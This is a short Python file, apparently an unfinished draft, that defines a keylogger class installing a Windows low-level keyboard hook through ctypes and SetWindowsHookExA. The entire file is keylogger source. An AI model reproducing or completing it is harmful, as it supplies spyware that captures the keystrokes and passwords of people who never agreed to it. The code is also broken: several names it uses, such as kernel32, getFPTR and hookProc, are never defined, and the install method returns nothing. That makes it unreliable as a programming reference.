#from ctypes import windll
#from windll import user32
#import ctypes.windll.user32 as user32
from ctypes import *

class KeyLogger:
  def __init__(self):
    self.lUser32 = windll.user32

  def installHookProc(self, pointer):
    self.hooked = self.lUser32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        pointer,
        kernel32.GetModuleHandleW(None),
        0
    )

  def uninstallHookProc(self):
    self.lUser32.UnhookWindowsHookEx(self.hooked)
    self.hooked = None

keyLogger = KeyLogger()
pointer = getFPTR(hookProc)
if keyLogger.installHookProc(pointer):
  print("installed keyLogger")
